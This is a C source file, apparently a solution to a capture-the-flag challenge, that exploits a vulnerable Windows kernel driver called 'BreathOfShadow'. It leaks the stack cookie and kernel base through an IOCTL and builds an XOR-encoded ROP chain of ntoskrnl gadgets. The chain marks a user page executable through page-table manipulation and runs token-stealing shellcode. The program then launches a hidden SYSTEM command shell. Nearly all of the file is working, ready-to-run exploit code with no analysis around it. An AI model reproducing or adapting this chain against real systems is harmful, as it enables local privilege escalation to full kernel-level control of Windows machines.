#define _CRT_SECURE_NO_WARNINGS

#include <stdio.h>
#include <Windows.h>

// get shellcode using MASM in VS
extern int TokenStealingShellcode();
extern size_t GetShellcodeSize();

#define BOS_IOCTL 0x9C40240B
#define BOS_DEVICENAME L"\\\\.\\BreathOfShadow"


int main() {
	HANDLE hDevice;
	size_t xorkey, cookie, ntBase, origRbp;
	size_t payload[0x300] = { 0, };
	BYTE* shellcode;
	size_t offset;

	hDevice = CreateFileW(
		BOS_DEVICENAME,
		GENERIC_READ | GENERIC_WRITE,
		0,
		NULL,
		OPEN_EXISTING,
		FILE_ATTRIBUTE_NORMAL,
		NULL
	);
	if (hDevice == INVALID_HANDLE_VALUE) {
		perror("CreateFileW");
		return -1;
	}

	DeviceIoControl(
		hDevice,
		BOS_IOCTL,
		payload,
		8,
		NULL,
		0x300,
		NULL,
		NULL
	);

	xorkey = payload[0];
	cookie = payload[0x20];
	ntBase = payload[0x2b] - 0x31f39;
	origRbp = payload[0x34]; // contains register values for nt!KiSystemServiceExit( partial trapframe )

	printf("[+] xorkey   = 0x%I64x\n", xorkey);
	printf("[+] canary   = 0x%I64x\n", cookie);
	printf("[+] ntoskrnl = 0x%I64x\n", ntBase);

	shellcode = VirtualAlloc(NULL, 0x1000, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
	if (shellcode == NULL) {
		perror("VirtualAlloc");
		return -1;
	}

	for (int i = 0; i < GetShellcodeSize(); i++)
		shellcode[i] = ((BYTE*)TokenStealingShellcode)[i];

	offset = (0x128 / 8);

	// pop rcx; ret
	payload[offset++] = ntBase + 0x1fc39;
	payload[offset++] = shellcode;

	// VA -> PTE -> PDE -> PPE -> PXE
	for (int i = 0; i < 4; i++) {
		// nt!MiGetPteAddress
		payload[offset++] = ntBase + 0xbadc8;

		// mov rcx, rax; mov rsi, [rsp+0x40]; mov rax, rcx; add rsp, 0x30; pop rdi; ret
		payload[offset++] = ntBase + 0x28df80;

		offset += 7;
	}

	// bit 63 == XD( eXecutable Disable ) bit

	// pop rcx; ret
	payload[offset++] = ntBase + 0x1fc39;
	payload[offset++] = 7;

	// add rax, rcx; ret
	payload[offset++] = ntBase + 0x194824;

	// pop rcx; ret
	payload[offset++] = ntBase + 0x1fc39;
	payload[offset++] = 0x0a;

	// mov dword ptr [rax], ecx; ret
	payload[offset++] = ntBase + 0x517ba;

	// GOTO shellcode
	payload[offset++] = shellcode;

	// mov dword ptr [rax], ecx; ret
	payload[offset++] = ntBase + 0x517ba;

	// pop rbp; ret
	payload[offset++] = ntBase + 0x2c734;
	payload[offset++] = origRbp;

	// goto nt!KiSystemServiceCopyEnd+0x25 instead of nt!KiSystemServiceExit, increase _KPCR.Prcb.KeSystemCalls
	// https://stackoverflow.com/questions/50202815/what-does-inc-dword-ptr-gs-doing-here/50257145
	payload[offset++] = ntBase + 0x1d2b15;

	for (size_t i = 0; i < offset; i++)
		payload[i] ^= xorkey;
	
	DeviceIoControl(
		hDevice,
		BOS_IOCTL,
		payload,
		0x300,
		NULL,
		0,
		NULL,
		NULL
	);

	printf("[+] get SYSTEM shell...\n");

	WinExec(getenv("COMSPEC"), SW_HIDE);
	CloseHandle(hDevice);
	return 0;
}